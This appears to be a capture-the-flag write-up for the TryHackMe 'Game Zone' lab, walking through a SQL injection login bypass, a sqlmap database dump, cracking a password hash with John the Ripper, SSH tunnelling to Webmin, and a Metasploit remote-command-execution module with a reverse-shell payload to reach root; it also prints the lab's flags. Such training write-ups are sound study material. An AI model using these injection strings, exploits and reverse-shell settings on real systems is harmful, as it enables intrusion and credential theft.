@@ -1,0 +1,264 @@
+# Game Zone | TryHackMe : https://tryhackme.com/room/gamezone
+
+Description : Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!
+
+## Initial data 
+````
+	Local IP : 10.14.12.121
+	Target IP : 10.10.195.247
+	### Exports if you want to  not copy-paste it all the time
+	export targetIP=10.10.195.247
+	export localIP=10.14.12.121
+	
+````
+
+
+
+## Task 1 |  Deploy the vulnerable machine 
+About starting the VM and checking if you can see the website.
+### Question 1:  What is the name of the large cartoon avatar holding a sniper on the forum?
+First question is something i know by heart; as i was a big fan of the franchise when it was still good.
+
+### Answer 
+The answer is ofcourse:
+	_**Agent 47**_
+
+Things i guess i always do to new machines:
+
+1. Run Nmap Initial Scan (-A)
+2. Run Gobuster
+3. Run nmap Full Portscan
+
+## Task 2 | Obtain access via SQLi 
+
+I navigate through the site with Burp Suite Proxy enabled so i can check the webpages loaded later.
+
+I investigate the login POST and attempt to insert basic SQL as the Task Describes. I send the request to the repeater and insert 
+	`' OR 1=1 -- -` 
+
+to the username (As instructed)
+_Use ' or 1=1 -- - as your username and leave the password blank._
+/* Use images here */
+	```
+	POST /index.php HTTP/1.1
+	Host: 10.10.70.215
+	Content-Length: 54
+	Cache-Control: max-age=0
+	Upgrade-Insecure-Requests: 1
+	Origin: http://10.10.195.247
+	Content-Type: application/x-www-form-urlencoded
+	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+	Referer: http://10.10.195.247/
+	Accept-Encoding: gzip, deflate
+	Accept-Language: en-US,en;q=0.9
+	Cookie: PHPSESSID=aip85smbfapug48ravs1ros022
+	Connection: close
+
+	username=' or 1=1 -- -&password=&x=20&y=6
+	```
+
+This gives us the Login success and redirects us:
+	```
+	HTTP/1.1 302 Found
+	Date: Wed, 07 Jul 2021 10:08:26 GMT
+	Server: Apache/2.4.18 (Ubuntu)
+	Expires: Thu, 19 Nov 1981 08:52:00 GMT
+	Cache-Control: no-store, no-cache, must-revalidate
+	Pragma: no-cache
+	Location: portal.php
+	Content-Length: 4502
+	Connection: close
+	Content-Type: text/html; charset=UTF-8
+	```
+### Answer 
+Note the _Location: portal.php_ header in the response.
+
+The answer is ofcourse:
+	_**portal.php**_
+
+## Task 3 | Using SQLMap
+
+When navigating to porta.php, you can tell its a seach field searching through a database.
+
+By searching for % it shows all results
+
+The task calls to use SQLMap and Burpsuite to figure out injection opportunities.
+I saved the request into a file to be used with SQLmap later on.
+	`sqlmap -r ./portal_search --dbms=mysql --dump`
+
+
+IT neatly displays the found user details:
+
+````
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+~~ SNIP ~~
+Database: db
+Table: post
+[5 entries]
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| id | name                           | description                                                                                                                                                                                            |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
+| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
+| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
+| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
+| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
++----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+````
+
+This answers our following questions:
+### Answer(s):
+In the users table, what is the hashed password?
+	_**In the users table, what is the hashed password?**_
+What was the username associated with the hashed password?
+	_**agent47**_
+What was the other table name?
+	_**post**_
+
+## Task 4 | Cracking a password with JohnTheRipper 
+I copy-pasted the hash from SQLMap into a hash.txt file and ran 
+	`john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
+This produces : videogamer124 as a password.
+
+
+I attempted to ssh to the machine, but it seems it was not responding to my SSH, so i restarted the machine:
+
+	`ssh agent47@10.10.195.247`
+	
+This caused a timeout. 
+
+
+After i restarted the Machine it didnt work either so i debugged ssh by adding the -v flag.
+	it was stuck on 
+	`debug1: expecting SSH2_MSG_KEX_ECDH_REPLY`
+	After some googling i found this and applied it to both my tun0 and eth0 interface, after that it worked!
+		https://serverfault.com/questions/210408/cannot-ssh-debug1-expecting-ssh2-msg-kex-dh-gex-reply
+	
+
+## Question : What is the user flag?
+
+Anyways; When ssh finally worked;
+
+```
+agent47@gamezone:~$ ls
+user.txt
+agent47@gamezone:~$ cat user.txt 
+649ac17b1480ac13ef1e4fa579dac95c
+```
+
+### Answer:
+	_**649ac17b1480ac13ef1e4fa579dac95c**_
+
+## Task 5 | Exposing services with reverse SSH tunnels 
+
+Lets see what ports are open on the target machine
+```
+gent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              
+udp   UNCONN     0      0                                                *:10000                                                        *:*                  
+udp   UNCONN     0      0                                                *:68                                                           *:*                  
+tcp   LISTEN     0      80                                       127.0.0.1:3306                                                         *:*                  
+tcp   LISTEN     0      128                                              *:10000                                                        *:*                  
+tcp   LISTEN     0      128                                              *:22                                                           *:*                  
+tcp   LISTEN     0      128                                             :::80                                                          :::*                  
+tcp   LISTEN     0      128                                             :::22                                                          :::*                  
+```
+
+When creating a tunnel from Remote machine to my machine i executed the following command (Suggested by the Room):
+
+	`ssh -L 10000:localhost:10000 agent47@10.10.195.247`
+	
+This means http://localhost:10000 is now available, and we see a Webmin CMS Login page.
+
+## Question : What is the name of the exposed CMS?
+### Answer
+_**Webmin**_
+
+## Question: What is the CMS version?
+
+We can investigate this by looking at the returned HTTP headers from a failed login attempt.
+```
+HTTP/1.0 200 Document follows
+Date: Wed, 7 Jul 2021 15:15:13 GMT
+Server: MiniServ/1.580
+Connection: close
+Set-Cookie: testing=1; path=/
+pragma: no-cache
+Expires: Thu, 1 Jan 1970 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: post-check=0, pre-check=0
+Content-type: text/html; Charset=iso-8859-1
+```
+
+### Answer
+Server: MiniServ/1.580
+_**1.580**_
+
+The Hint for this question was: can you use some other credentials.
+
+On further inspection i was able to login with the ssh user/pass
+`agent47 | videogamer124`
+and obtained access to the Webmin panel
+
+
+##  Task 6  | Privilege Escalation with Metasploit 
+
+It wants us to use Metasploit to find an exploit for Webmin 1.580. lets do it;
+
+We launch up metasploit
+	`msfconsole`
+	
+Then we search for an exploit for webmin
+	`use webmin`
+A list presents itself, i select the first one
+```
+msf6 > use webmin
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+   4  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   5  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+  
+msf6 > use 0
+```
+
+i do 
+	`show options`
+and set 
+````
+	set RHOST = 127.0.0.1
+	set SSL = false
+	
+Then we have to select a payload to make a reverse shell for us after sucessful exploit:
+	set PAYLOAD cmd/unix/reverse
+	set LHOST = <LOCAL tun0 IP>
+	set LPORT = 4444
+````
+after that we run the framework and have a reverse shell running on the remote machine.
+
+## Question : What is the root flag?
+```
+cd /root
+ls
+root.txt
+cat root.txt    
+```
+## Answer
+_**a4b945830144bdd71908d12d902adeee**_
+
